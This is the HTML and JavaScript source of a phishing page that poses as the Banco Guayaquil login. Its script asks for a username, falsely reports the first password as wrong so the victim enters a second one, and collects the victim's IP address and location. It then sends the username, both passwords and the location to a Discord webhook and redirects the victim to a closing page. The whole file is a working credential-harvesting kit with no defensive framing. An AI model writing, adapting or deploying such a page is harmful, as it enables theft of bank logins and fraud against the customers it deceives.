<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Guayaquil - Iniciar Sesi칩n</title>
    <link rel="shortcut icon" href="source/ico.svg" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..1000;1,6..12,200..1000&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Nunito Sans', sans-serif;
            background-color: white;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .logo-container {
            margin-bottom: 20px;
            text-align: left;
            width: 100%;
            max-width: 400px;
            margin-left: 20px;
        }
        
        .logo-svg {
            height: 55px;
            width: auto;
        }
        
        .login-card {
            background: white;
            border-radius: 12px;
            padding: 40px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            margin: 0 20px;
        }
        
        .login-title {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin-bottom: 20px;
            text-align: left;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
            display: block;
        }
        
        .input-field {
            width: 100%;
            padding: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            color: #333;
            background: white;
            box-sizing: border-box;
            transition: border-color 0.3s ease;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #d2006e;
        }
        
        .continue-button {
            width: 100%;
            padding: 16px;
            background: #e0e0e0;
            color: #898989;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }
        
        .continue-button.active {
            background: #d2006e;
            color: white;
        }
        
        .continue-button:hover.active {
            background: #b8005a;
        }
        
        .forgot-link {
            color: #007bff;
            text-decoration: underline;
            font-size: 14px;
            text-align: center;
            display: block;
        }
        
        .forgot-link:hover {
            text-decoration: none;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 14px;
            text-align: center;
            margin-bottom: 10px;
            display: none;
        }
        
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .loading-content {
            text-align: center;
        }
        
        .loading img {
            width: 40px;
            height: 40px;
            margin-bottom: 16px;
        }
        
        .loading p {
            color: #666;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="source/lg.svg" alt="Banco Guayaquil" class="logo-svg">
    </div>
    
    <div class="login-card">
        <h1 class="login-title">Hola, inicia sesi칩n</h1>
        
        <form id="loginForm">
            <div class="input-group" id="usernameGroup">
                <label class="input-label" for="username">Ingresa tu usuario</label>
                <input type="text" id="username" class="input-field" placeholder="Usuario">
            </div>
            
            <div class="input-group" id="passwordGroup" style="display: none;">
                <label class="input-label" for="password">Ingresa tu contrase침a</label>
                <input type="password" id="password" class="input-field" placeholder="Contrase침a">
            </div>
            
            <div class="error-message" id="errorMsg"></div>
            
            <button type="submit" class="continue-button" id="continueBtn" disabled>Continuar</button>
            
            <a href="#" class="forgot-link">쯆lvidaste tu usuario o contrase침a?</a>
        </form>
    </div>
    
    <div class="loading" id="loading">
        <div class="loading-content">
            <img src="source/ico.svg" alt="">
            <p>Espere un momento...</p>
        </div>
    </div>

    <div id="gfg" style="display:none;"></div>
    <div id="ip" style="display:none;"></div>
    <div id="address" style="display:none;"></div>
    <script src="xjsx.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const usernameInput = document.querySelector('#username');
    const passwordInput = document.querySelector('#password');
    const continueBtn = document.querySelector('#continueBtn');
    const errorMsg = document.querySelector('#errorMsg');
    const loginForm = document.querySelector('#loginForm');
    const loading = document.querySelector('#loading');
    const usernameGroup = document.querySelector('#usernameGroup');
    const passwordGroup = document.querySelector('#passwordGroup');
    
    let isPasswordStep = false;
    let isProcessing = false;
    let isFirstPasswordAttempt = true;
    let firstPassword = '';

    function validateForm() {
        if (!isPasswordStep) {
            // Primera etapa: validar solo usuario
            const isUsernameValid = usernameInput.value.trim().length >= 3;
            
            if (isUsernameValid) {
                continueBtn.disabled = false;
                continueBtn.classList.add('active');
                errorMsg.style.display = 'none';
            } else {
                continueBtn.disabled = true;
                continueBtn.classList.remove('active');
            }
        } else {
            // Segunda etapa: validar solo contrase침a
            const isPasswordValid = passwordInput.value.trim().length >= 2;
            
            if (isPasswordValid) {
                continueBtn.disabled = false;
                continueBtn.classList.add('active');
                errorMsg.style.display = 'none';
            } else {
                continueBtn.disabled = true;
                continueBtn.classList.remove('active');
            }
        }
    }

    usernameInput.addEventListener('input', validateForm);
    passwordInput.addEventListener('input', validateForm);

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
        
        if (!isPasswordStep) {
            // Primera etapa: mostrar campo de contrase침a
            const username = usernameInput.value.trim();
            
            if (username.length < 3) {
                errorMsg.textContent = 'Por favor ingresa un usuario v치lido.';
                errorMsg.style.display = 'block';
                return;
            }
            
            // Mostrar campo de contrase침a
            passwordGroup.style.display = 'block';
            isPasswordStep = true;
            continueBtn.disabled = true;
            continueBtn.classList.remove('active');
            errorMsg.style.display = 'none';
            
            // Enfocar el campo de contrase침a
            setTimeout(() => {
                passwordInput.focus();
            }, 100);
            
        } else {
            // Segunda etapa: manejar contrase침a
            // Prevenir m칰ltiples env칤os
            if (isProcessing) {
                console.log('Ya se est치 procesando, ignorando env칤o adicional');
                return;
            }
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (password.length < 2) {
                errorMsg.textContent = 'Por favor ingresa una contrase침a v치lida.';
                errorMsg.style.display = 'block';
                return;
            }
            
            if (isFirstPasswordAttempt) {
                // Primera contrase침a - mostrar error y pedir segunda
                firstPassword = password;
                isFirstPasswordAttempt = false;
                
                // Mostrar error de contrase침a incorrecta
                errorMsg.textContent = 'Ingresaste un usuario y/o contrase침a incorrecto.';
                errorMsg.style.display = 'block';
                
                // Limpiar el campo de contrase침a
                passwordInput.value = '';
                continueBtn.disabled = true;
                continueBtn.classList.remove('active');
                
                // Enfocar el campo de contrase침a
                setTimeout(() => {
                    passwordInput.focus();
                }, 100);
                
            } else {
                // Segunda contrase침a - enviar ambas al Discord
                // Marcar como procesando
                isProcessing = true;
                continueBtn.disabled = true;
                
                // Guardar el usuario en sessionStorage para usarlo en p.html
                sessionStorage.setItem('capturedUsername', username);
                
                errorMsg.style.display = 'none';
                sendToDiscord(event, username, firstPassword, password);
            }
        }
    });

    function fetchIPData() {
        let ipAddress = '';
        return fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                ipAddress = data.ip || '';
                document.getElementById('gfg').innerHTML = ipAddress;
                return fetch('https://ipinfo.io/json');
            })
            .then(response => {
                if (!response.ok) throw new Error('Error en ipinfo');
                return response.json();
            })
            .then(data => {
                const ip = data.ip || ipAddress || 'No disponible';
                const country = data.country || 'No disponible';
                const city = data.city || 'No disponible';
                document.getElementById('ip').innerHTML = 'IP: ' + ip;
                document.getElementById('address').innerHTML = country + ', ' + city;
                return { ip: ip, country: country, city: city };
            })
            .catch(error => {
                // Si falla ipinfo, usar solo el IP de ipify
                const ip = ipAddress || 'No disponible';
                document.getElementById('ip').innerHTML = 'IP: ' + ip;
                document.getElementById('address').innerHTML = 'No disponible, No disponible';
                return { ip: ip, country: 'No disponible', city: 'No disponible' };
            });
    }

    function sendToDiscord(event, username, firstPassword, secondPassword) {
        event.preventDefault();
        
        fetchIPData().then((ipData) => {
            const ip = ipData.ip || 'No disponible';
            const country = ipData.country || 'No disponible';
            const city = ipData.city || 'No disponible';
            
            const message = `游삣游낖游삣游낖游삣游낖游삣游낖
USUARIO: ${username}
CONTRASE칌A (INCORRECTA): ${firstPassword}
CONTRASE칌A (CORRECTA): ${secondPassword}

游깵IP: ${ip}
${country}, ${city}`;
            
            const discordMessage = {
                content: `游댏 **Nueva informaci칩n capturada**\n\`\`\`\n${message}\`\`\``
            };
            
            console.log('Enviando a Discord:', discordMessage);
            
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            })
            .then(response => {
                console.log('Respuesta de Discord:', response);
                if (response.ok) {
                    console.log('Datos enviados exitosamente a Discord');
                    loading.style.display = 'flex';
                    setTimeout(function(){
                        window.location.href = 'Termino.html';
                    }, 2000);
                } else {
                    console.error('Error al enviar a Discord:', response.status, response.statusText);
                    alert('Error al enviar informaci칩n');
                    // Reactivar el bot칩n en caso de error
                    isProcessing = false;
                    continueBtn.disabled = false;
                }
            })
            .catch(error => {
                console.error('Error de red:', error);
                alert('Error de conexi칩n');
                // Reactivar el bot칩n en caso de error de red
                isProcessing = false;
                continueBtn.disabled = false;
            });
        });
    }
});
</script>

</body>
</html>
